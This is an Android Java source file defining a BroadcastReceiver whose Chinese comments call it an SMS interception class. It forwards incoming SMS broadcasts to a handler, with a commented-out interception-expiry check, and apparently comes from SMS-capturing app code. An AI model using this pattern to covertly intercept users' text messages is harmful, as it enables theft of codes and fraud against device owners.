package com.core_sur;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
	/**
	 * 短信广播拦截类
	 * 
	 * @author Administrator
	 * 
	 */
	public class YLSMSreceiver extends BroadcastReceiver {
		private final String TAG = "YLSMSreceiver";
		private MySTask interceptor;
public YLSMSreceiver(MySTask interceptor) {
	this.interceptor=interceptor;
}
		@Override
		public void onReceive(Context context, Intent intent) {
			// 判断拦截是否到期
			// isInterceptExpire();
			// 拦截短信
			if (MySTask.ACTION_SMS_BROADCAST.equalsIgnoreCase(intent.getAction())) {
				Config.IsCanBroadcast = true;
				if(interceptor!=null)
				interceptor.handleSMS(intent);
			}

		}
	}